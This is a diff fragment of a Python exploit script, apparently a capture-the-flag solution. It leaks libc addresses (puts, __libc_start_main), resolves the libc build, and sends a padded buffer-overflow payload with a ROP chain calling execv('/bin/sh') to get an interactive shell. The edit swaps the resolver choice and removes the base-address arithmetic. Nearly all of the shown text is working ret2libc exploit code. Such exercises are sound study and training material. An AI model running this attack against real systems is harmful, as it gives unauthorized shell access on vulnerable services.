@@ -65,12 +65,11 @@ puts = struct.unpack("<Q", leak)[0]
 print("libc_start_main: 0x%x" % libc_start_main)
 print("puts: 0x%x" % puts)
 
-lib = libc_resolve({"__libc_start_main": libc_start_main, "puts": puts}, choice=1)
-base = libc_start_main - lib.symbols["__libc_start_main"]
+lib = libc_resolve({"__libc_start_main": libc_start_main, "puts": puts}, choice=0)
 
 io.recvuntil("to?\n")
 rop = ROP(exe)
-rop.call(lib.symbols["execv"] + base, [next(lib.search("/bin/sh\0"))  + base, 0])
+rop.call(lib.symbols["execv"], [next(lib.search("/bin/sh\0")) , 0])
 io.sendline("a" * offset + rop.chain())
 io.interactive()
 ```
